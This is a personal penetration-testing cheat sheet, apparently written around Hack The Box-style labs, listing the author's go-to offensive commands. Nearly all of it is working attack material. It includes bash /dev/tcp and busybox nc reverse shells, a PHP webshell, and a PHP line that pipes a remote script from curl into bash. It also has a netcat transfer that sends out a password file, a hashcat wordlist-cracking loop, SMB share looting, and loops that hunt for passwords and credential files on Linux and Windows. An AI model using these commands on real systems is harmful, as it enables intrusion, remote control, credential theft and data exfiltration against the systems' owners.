---
description: >-
  A list of commands I regularly rely on and always like to have handy. They’ve
  saved me time more than once, and it’s great to keep them within reach for
  quick access.
---

# Essentials

### Shells

```bash
# Bash shell
bash -c 'bash -i >& /dev/tcp/10.14.11./443 0>&1'

# Small php webshell
system($_GET['cmd']);

# PHP Curl shell
<?php system('curl 10.10.your.ip/rev.sh|bash') ?>

# Busybox
busybox nc 172.16.210.3 7878 -e /bin/bash
```

{% embed url="https://www.revshells.com/" %}

### Upgrading shell

```bash
# Python shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo; fg
export TERM=xterm

# Shell 
/bin/sh -i

# Bash shell
script /dev/null -c bash
```

### NC File transfer

```bash
# Listen
nc -lvnp 8888 > pass.txt

# Send
nc -w 3 10.129.231.66 8888 < pass.txt
```

### Use multiple wordlists with tools like Hashcat or Ffuff.

```bash
#!/bin/bash
# Configuration
hash_file="hash"
hash_type=5600
wordlists=(
    "/home/kali/rockyou.txt"
    "/home/kali/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt"
    "/home/kali/SecLists/Passwords/openwall.net-all.txt"
    "/home/kali/SecLists/Passwords/mssql-passwords-nansh0u-guardicore.txt"
    "/home/kali/SecLists/Passwords/Most-Popular-Letter-Passes.txt"
    "/home/kali/SecLists/Passwords/probable-v2-top12000.txt"
    "/home/kali/SecLists/Passwords/darkweb2017-top10000.txt"
    "/home/kali/SecLists/Passwords/cirt-default-passwords.txt"
    "/home/kali/SecLists/Passwords/500-worst-passwords.txt"
    "/home/kali/SecLists/Passwords/2023-200_most_used_passwords.txt"
)

# Loop through each wordlist and run Hashcat
for wordlist in "${wordlists[@]}"; do
  if [[ -f "$wordlist" ]]; then
    echo "Running Hashcat with wordlist: $wordlist"
    hashcat -m "$hash_type" "$hash_file" "$wordlist" --quiet
  else
    echo "Wordlist not found: $wordlist"
  fi
done

echo "Hashcat scanning complete."
```

### Curl shell

```bash
curl http://10.10.14.74:8000/shell.sh --output /tmp/shell.sh
```

### SMB

```bash
# No login
smbclient -N -L 10.10.10.10

# Call share
smbclient //10.10.10.10/share

# Login
smbclient -L 10.129.123.30 -U Administrator

# Get shares
sudo crackmapexec smb 172.16.7.3 -u 'username' -p 'password' --shares

# Download share recursive
smbclient \\\\172.16.19.3\\Users -U username -c "prompt off; recurse on; mget *" 

# Setup server
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

### Search in Linux

```bash
# Search user
find / -user srvadm 2>/dev/null | grep -v '^/proc\|^/sys\|^/run'

# Search groups
find / -group staff -writable 2>/dev/null | grep -v '^/proc\|^/sys\|^/run'

# Using find
find . -name thisfile.txt

# Search config files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Search for password
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

# Search for databases
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

### Search in Windows

```bash
<pre class="language-bash"><code class="lang-bash"># Search string
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Search powershell
PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

# Search file contents for string
findstr /SI /M "password" *.xml *.ini *.txt
<strong>
</strong><strong># Search file contents with powershell
</strong>select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password

# Search for file extensions
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

# Search for file extensions
where /R C:\ *.config

# Search exentions powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
</code></pre>
```

### Netcat

```bash
# Port forward
ncat -k -l -p 8001 -c "ncat localhost 8000"

# Reverse shell
ssh -R 33555:localhost:9999 root@142.93.142.231

# Ping sweep
nc -vz -w 2 192.168.1.1-254

# Port scan
nc -vz -w 0.1 192.168.1.1-254 | grep -v "Connection timed out"
```
